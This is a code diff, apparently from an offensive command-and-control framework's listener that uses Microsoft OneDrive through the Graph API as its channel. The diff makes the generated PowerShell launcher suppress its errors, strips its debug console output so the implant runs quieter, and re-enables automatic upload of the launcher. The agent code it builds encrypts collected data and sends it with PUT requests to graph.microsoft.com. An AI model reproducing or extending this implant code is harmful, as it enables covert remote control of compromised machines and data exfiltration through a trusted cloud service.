@@ -179,7 +179,6 @@ class Listener:
 
             if language.startswith("power"):
                 launcher = '$ErrorActionPreference = \"SilentlyContinue\";' #Set as empty string for debugging
-                launcher = ''
 
                 if safeChecks.lower() == 'true':
                     launcher += helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
@@ -372,7 +371,6 @@ class Listener:
         if($packets) {
             $encBytes = encrypt-bytes $packets
             $routingPacket = New-RoutingPacket -encData $encBytes -Meta 5
-            write-host $packets.length, $encbytes.length, $routingpacket.length
 
             $wc = Get-WebClient
             $resultsFolder = "%s"
@@ -384,13 +382,10 @@ class Listener:
                 } catch {}
 
                 if($data -and $data.length -ne 0) {
-                    write-host "Appending old data, $($data.length) bytes"
                     $routingPacket = $data + $routingPacket
                 }
 
                 $wc = Get-WebClient
-
-                write-host "Trying to upload https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content"
                 $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket)
                 $script:missedChecking = 0
             }
@@ -424,7 +419,6 @@ class Listener:
             }
         }
     }
-    write-host "Got agent code"
             """ % ("%s/%s" % (listener_options['BaseFolder']['Value'], listener_options['TaskingsFolder']['Value']))
 
             return token_manager + post_message + get_message
@@ -591,7 +585,7 @@ class Listener:
             try:
                 if listener_name in self.mainMenu.listeners.activeListeners.keys():
                     upload_stager()
-                    #upload_launcher()
+                    upload_launcher()
                     break
                 else:
                     time.sleep(1)
